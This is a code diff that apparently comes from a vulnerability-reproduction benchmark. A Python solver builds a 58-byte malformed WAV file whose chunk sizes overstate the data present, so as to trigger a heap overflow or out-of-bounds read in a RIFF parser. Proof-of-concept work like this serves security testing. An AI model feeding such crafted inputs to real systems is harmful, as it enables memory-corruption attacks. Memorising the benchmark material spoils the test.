@@ -1,58 +1,76 @@
-import os
 import struct
+import os
+from typing import Optional
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a minimal RIFF file with chunk size mismatch to trigger overflow
-        # RIFF header: 'RIFF' (4 bytes) + file_size (4 bytes) + 'WAVE' (4 bytes)
-        # Then a 'fmt ' chunk with incorrect size to cause overflow
+        # Create a RIFF file with malformed chunk sizes to trigger heap overflow
+        # The vulnerability: data size not properly checked against end of RIFF chunk
         
-        # File structure:
-        # RIFF header: 12 bytes
-        # 'fmt ' chunk header: 8 bytes
-        # 'fmt ' data: 16 bytes (but we'll claim larger size)
-        # 'data' chunk header: 8 bytes
-        # 'data' content: minimal audio data
+        # RIFF structure: 'RIFF' + total_size + 'WAVE' + 'fmt ' + fmt_size + fmt_data + 'data' + data_size + data
         
-        # Total target: 58 bytes (ground truth)
+        # We'll create a WAV file where the data chunk claims more data than exists
+        # This should cause out-of-bounds read when parsing
         
-        # Build RIFF header
+        # Using ground-truth length of 58 bytes as guidance
+        
+        # Build minimal WAV file structure
         riff_header = b'RIFF'
-        
-        # Overall file size: 58 - 8 = 50 (minus 8 for 'RIFF' and size field)
-        file_size = 50  # Little-endian
-        riff_size = struct.pack('<I', file_size)
         wave_format = b'WAVE'
+        fmt_chunk = b'fmt '
+        data_chunk = b'data'
         
-        # Build 'fmt ' chunk with incorrect size to trigger overflow
-        fmt_chunk_id = b'fmt '
-        fmt_chunk_size = 100  # Much larger than actual data, should cause overflow
-        fmt_chunk_size_bytes = struct.pack('<I', fmt_chunk_size)
+        # Calculate sizes
+        # Total RIFF size: file_size - 8 bytes (RIFF header and size field)
+        # We'll make file 58 bytes total
         
-        # Minimal fmt chunk data (16 bytes for PCM)
-        # We'll only provide 16 bytes but claim 100
-        fmt_data = struct.pack('<HHIIHH', 1, 1, 44100, 44100, 1, 8)  # PCM, mono, 44.1kHz, 8-bit
+        # fmt chunk: 16 bytes for PCM format data
+        fmt_size = 16
+        fmt_data = struct.pack('<HHIIHH', 1, 1, 8000, 16000, 2, 16)  # PCM, mono, 8000Hz, 16-bit
         
-        # Build 'data' chunk
-        data_chunk_id = b'data'
-        data_chunk_size = 2  # Minimal audio data
-        data_chunk_size_bytes = struct.pack('<I', data_chunk_size)
-        data_content = b'\x00\x00'  # 2 bytes of silence
+        # data chunk: We'll claim more data than we actually provide
+        # This is the key to trigger the vulnerability
+        # We'll claim 1000 bytes of data but only provide 10
+        data_size_claimed = 1000  # Large size to trigger overflow
+        actual_data_size = 10     # Actual data we provide
         
-        # Assemble the file
-        # Note: We're creating fmt chunk with declared size 100 but only providing 16 bytes
-        # This should cause buffer overflow when reading chunk data
-        poc = (riff_header + riff_size + wave_format +
-               fmt_chunk_id + fmt_chunk_size_bytes + fmt_data[:16] +  # Only 16 bytes of fmt data
-               data_chunk_id + data_chunk_size_bytes + data_content)
+        # Calculate total file size
+        # 12 bytes for RIFF header (4 + 4 + 4)
+        # 8 + 16 = 24 bytes for fmt chunk
+        # 8 + actual_data_size = 18 bytes for data chunk
+        # Total: 12 + 24 + 18 = 54 bytes
+        # Need 58 bytes total, so we'll add 4 extra bytes at the end
         
-        # Pad to exactly 58 bytes if needed
-        current_len = len(poc)
-        if current_len < 58:
-            # Add padding with zeros
-            poc += b'\x00' * (58 - current_len)
-        elif current_len > 58:
-            # Trim if somehow longer (shouldn't happen)
-            poc = poc[:58]
-            
-        return poc
+        # Adjust to get exactly 58 bytes
+        extra_bytes = 4
+        total_size = 8 + len(wave_format) + (8 + fmt_size) + (8 + actual_data_size) + extra_bytes
+        
+        # Build the file
+        poc = bytearray()
+        
+        # RIFF header
+        poc.extend(riff_header)
+        poc.extend(struct.pack('<I', total_size - 8))  # RIFF chunk size
+        poc.extend(wave_format)
+        
+        # fmt chunk
+        poc.extend(fmt_chunk)
+        poc.extend(struct.pack('<I', fmt_size))
+        poc.extend(fmt_data)
+        
+        # data chunk - this is where the vulnerability is triggered
+        poc.extend(data_chunk)
+        poc.extend(struct.pack('<I', data_size_claimed))  # Claim more data than exists
+        
+        # Add minimal actual data
+        poc.extend(b'\x00' * actual_data_size)
+        
+        # Add extra bytes to reach 58 bytes total
+        poc.extend(b'\x00' * extra_bytes)
+        
+        # Verify we have exactly 58 bytes
+        if len(poc) != 58:
+            # Adjust to exactly 58 bytes
+            poc = poc[:58] if len(poc) > 58 else poc + b'\x00' * (58 - len(poc))
+        
+        return bytes(poc)
